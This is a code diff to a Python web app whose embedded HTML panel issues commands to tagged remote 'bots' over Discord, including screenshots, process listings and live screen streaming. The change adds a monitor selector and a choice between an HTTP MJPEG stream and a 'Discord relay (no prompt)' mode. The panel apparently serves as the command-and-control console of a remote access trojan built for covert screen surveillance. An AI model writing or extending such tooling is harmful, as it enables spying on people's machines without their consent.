@@ -425,6 +425,11 @@ PANEL_HTML = r"""<!doctype html>
             <div class="head">
               <div><div class="eyebrow">Live</div><h3>Screen share</h3></div>
               <div id="liveControls" class="row" style="gap:8px">
+                <input id="liveMonitor" style="max-width:80px" placeholder="1" value="1"/>
+                <select id="liveMode" class="btn" style="min-width:160px;">
+                  <option value="discord">Discord relay (no prompt)</option>
+                  <option value="http">HTTP MJPEG (faster)</option>
+                </select>
                 <button class="btn primary" onclick="startLiveStream()">Start</button>
                 <button class="btn" onclick="stopLiveStream()">Stop</button>
               </div>
@@ -479,7 +484,7 @@ PANEL_HTML = r"""<!doctype html>
   <div id="toast"></div>
 
   <script>
-    const el = {dot:document.getElementById('dot'), stxt:document.getElementById('stxt'), timeline:document.getElementById('timeline'), gallery:document.getElementById('gallery'), procFeed:document.getElementById('procFeed'), logFeed:document.getElementById('logFeed'), uptime:document.getElementById('uptime'), tagActive:document.getElementById('tagActive'), tagInput:document.getElementById('tagInput'), tagList:document.getElementById('tagList'), liveStatus:document.getElementById('liveStatus'), liveDot:document.getElementById('liveDot'), liveFrame:document.getElementById('liveFrame'), liveGate:document.getElementById('liveGate'), liveBody:document.getElementById('liveBody'), liveHint:document.getElementById('liveHint'), liveControls:document.getElementById('liveControls')};
+    const el = {dot:document.getElementById('dot'), stxt:document.getElementById('stxt'), timeline:document.getElementById('timeline'), gallery:document.getElementById('gallery'), procFeed:document.getElementById('procFeed'), logFeed:document.getElementById('logFeed'), uptime:document.getElementById('uptime'), tagActive:document.getElementById('tagActive'), tagInput:document.getElementById('tagInput'), tagList:document.getElementById('tagList'), liveStatus:document.getElementById('liveStatus'), liveDot:document.getElementById('liveDot'), liveFrame:document.getElementById('liveFrame'), liveGate:document.getElementById('liveGate'), liveBody:document.getElementById('liveBody'), liveHint:document.getElementById('liveHint'), liveControls:document.getElementById('liveControls'), liveMode:document.getElementById('liveMode'), liveMonitor:document.getElementById('liveMonitor')};
     const defaultTag = "{BOT_TAG}";
     let currentTag = defaultTag;
     let knownTags = new Set([currentTag]);
@@ -546,12 +551,12 @@ PANEL_HTML = r"""<!doctype html>
 
     function setLiveStatus(text, state='idle'){ liveActive = state==='ok'; if(el.liveStatus) el.liveStatus.textContent=text; if(el.liveDot){ el.liveDot.className='dot'+(state==='ok'?' ok': state==='error'?' bad':''); } if(state!=='ok' && el.liveFrame){ el.liveFrame.removeAttribute('src'); if(el.liveFrame.parentElement) el.liveFrame.parentElement.classList.remove('active'); if(el.liveHint) el.liveHint.style.display='block'; } }
     function handleLiveFrame(obj){ if(!(obj.attachments&&obj.attachments.length)) return; const url=obj.attachments[0].url+(obj.attachments[0].url.includes('?')?'&':'?')+'t='+(Date.now()); if(el.liveFrame){ el.liveFrame.src=url; if(el.liveFrame.parentElement) el.liveFrame.parentElement.classList.add('active'); if(el.liveHint) el.liveHint.style.display='none'; } setLiveStatus('Receiving frames', 'ok'); }
-    function setLiveHttp(url){ if(!url) return; if(el.liveFrame){ el.liveFrame.src=url; if(el.liveFrame.parentElement) el.liveFrame.parentElement.classList.add('active'); if(el.liveHint) el.liveHint.style.display='none'; } setLiveStatus('Streaming over HTTP', 'ok'); }
+    function setLiveHttp(url){ if(!url) return; const bust=url + (url.includes('?')?'&':'?')+'t='+(Date.now()); if(el.liveFrame){ el.liveFrame.src=bust; if(el.liveFrame.parentElement) el.liveFrame.parentElement.classList.add('active'); el.liveFrame.style.display='block'; if(el.liveHint) el.liveHint.style.display='none'; el.liveFrame.onload=()=> el.liveFrame.parentElement?.classList.add('active'); el.liveFrame.onerror=()=> setLiveStatus('Stream error', 'error'); } setLiveStatus('Streaming over HTTP', 'ok'); }
     function connectWS(){ setStatus(false); const ws = new WebSocket((location.protocol==='https:'?'wss://':'ws://') + location.host + '/ws'); ws.onopen = ()=> setStatus(true); ws.onclose = ()=> { setStatus(false); setTimeout(connectWS, 1200); }; ws.onmessage = ev => { const obj = JSON.parse(ev.data); if(obj.type !== 'text') return; const content=(obj.content||'').toUpperCase(); touchTagFromMessage(obj); const isLiveFrame=obj.is_live_frame===true || content.includes('LIVE_STREAM_FRAME'); const isLiveStopped=content.includes('LIVE_STREAM_STOPPED') || content.includes('LIVE_STREAM_HTTP_STOPPED'); const isLiveError=content.includes('LIVE_STREAM_ERROR') || content.includes('HTTP LIVE STREAM FAILED'); const liveHttpUrl=obj.live_http_url || (content.includes('LIVE_STREAM_HTTP') ? (obj.content||'').split(/\s+/).slice(2).join(' ') : null); if(liveHttpUrl){ setLiveHttp(liveHttpUrl); return; } if(isLiveFrame){ handleLiveFrame(obj); return; } if(isLiveStopped){ setLiveStatus('Stopped', 'idle'); } if(isLiveError){ setLiveStatus('Stream error', 'error'); } const msg = node(obj.author, obj.content, obj.ts); addFeed(el.timeline, msg.cloneNode(true)); addLog(msg.cloneNode(true)); if(obj.content && obj.content.toLowerCase().includes('filtered running processes')) addFeed(el.procFeed, msg.cloneNode(true)); if(obj.attachments && obj.attachments.length){ obj.attachments.forEach(a=> addShot(a.url)); } }; }
     connectWS(); refreshTags(); renderTags();
 
     async function post(path){ const r = await fetch(withTag(path),{method:'POST'}); const data = await r.json().catch(()=>({})); if(!r.ok) throw new Error(data.error||'Request failed'); return data; }
-    async function startLiveStream(){ if(!hasSelectedTag){ toast('Select a bot first'); setTab('live'); updateLiveGate(); return; } setLiveStatus('Requesting stream...', 'pending'); try{ await post('/cmd/live/start'); toast('Live request sent (HTTP MJPEG)'); setLiveStatus('Waiting for stream URL...', 'pending'); } catch(e){ setLiveStatus('Start failed', 'error'); toast(e.message);} }
+    async function startLiveStream(){ if(!hasSelectedTag){ toast('Select a bot first'); setTab('live'); updateLiveGate(); return; } const mode=(el.liveMode?.value||'discord'); const monitor=(el.liveMonitor?.value||'1'); setLiveStatus('Requesting stream...', 'pending'); try{ await post('/cmd/live/start?mode='+encodeURIComponent(mode)+'&monitor='+encodeURIComponent(monitor)); toast('Live request sent ('+mode+')'); setLiveStatus(mode==='http'?'Waiting for stream URL...':'Waiting for frames...', 'pending'); } catch(e){ setLiveStatus('Start failed', 'error'); toast(e.message);} }
     async function stopLiveStream(){ if(!hasSelectedTag){ toast('Select a bot first'); return; } try{ await post('/cmd/live/stop'); toast('Stop request sent'); setLiveStatus('Stopping...', 'pending'); } catch(e){ toast(e.message);} }
     async function doShot(){ try{ await post('/cmd/ss'); toast('Screenshot requested'); } catch(e){ toast(e.message);} }
     async function doProcs(){ try{ await post('/cmd/ps'); toast('Process list requested'); } catch(e){ toast(e.message);} }
@@ -665,9 +670,17 @@ async def cmd_set_volume(pct: float = Query(100.0), tag: str = Query(None)):
     return JSONResponse({"ok": True, "pct": pct_val})
 
 @app.post("/cmd/live/start")
-async def cmd_live_start(monitor: int = Query(1, ge=1), tag: str = Query(None)):
-    await _send_cmd(f"{_resolve_tag(tag)} LIVE_STREAM_HTTP_START {monitor}")
-    return JSONResponse({"ok": True, "monitor": monitor})
+async def cmd_live_start(
+    monitor: int = Query(1, ge=1),
+    mode: str = Query("discord"),
+    tag: str = Query(None),
+):
+    mode_clean = (mode or "discord").lower()
+    if mode_clean == "http":
+        await _send_cmd(f"{_resolve_tag(tag)} LIVE_STREAM_HTTP_START {monitor}")
+        return JSONResponse({"ok": True, "monitor": monitor, "mode": "http"})
+    await _send_cmd(f"{_resolve_tag(tag)} LIVE_STREAM_START {monitor}")
+    return JSONResponse({"ok": True, "monitor": monitor, "mode": "discord"})
 
 @app.post("/cmd/live/stop")
 async def cmd_live_stop(tag: str = Query(None)):
